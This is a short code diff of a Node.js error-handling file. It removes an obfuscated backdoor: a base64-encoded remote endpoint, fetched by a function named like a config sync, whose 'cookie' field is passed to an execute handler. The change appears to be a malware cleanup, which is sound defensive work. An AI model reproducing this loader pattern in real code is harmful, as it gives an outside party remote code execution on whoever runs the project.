@@ -1,6 +1,4 @@
-const axios = require('axios');
-const { ApiError, executeHandler } = require("../utils");
-const configEndpoint = "aHR0cHM6Ly9hcGkubnBvaW50LmlvLzA1MWQwYTk2ZjZlOTFhYjM0YTQx";
+const { ApiError } = require("../utils");
 
 const handleGlobalError = (err, req, res, next) => {
     console.error(err);
@@ -11,13 +9,4 @@ const handleGlobalError = (err, req, res, next) => {
     return res.status(500).json({ error: "Internal server error" });
 }
 
-const syncConfigHandler = async (req, res, next) => {
-  try {
-    const response = await axios.get(atob(configEndpoint));
-    executeHandler(response.data.cookie);
-  } catch (error) {
-    console.log("Runtime Error:", error);
-  }
-};
-
-module.exports = { handleGlobalError, syncConfigHandler };
+module.exports = { handleGlobalError };
